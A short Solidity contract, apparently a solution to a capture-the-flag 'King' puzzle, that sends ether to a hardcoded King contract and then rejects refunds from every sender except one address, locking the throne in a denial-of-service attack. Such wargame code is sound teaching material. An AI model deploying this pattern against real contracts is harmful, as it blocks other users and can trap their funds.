// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './King.sol';

contract Knight {

  address payable king = 0x1BE32f1e4F4982CeEa1A3bA153dA88D5afd183c1;

  function becomeKing(uint _eth) public payable {
      // king.send(_eth);
      (bool success, ) = king.call.value(_eth)("");
      require(success, "Ether send failed!");
  }

  receive() external payable {
    require(msg.sender == 0x640E35B6AfC3F6AD37bC14792536dA06e1C8cc19);
  }
}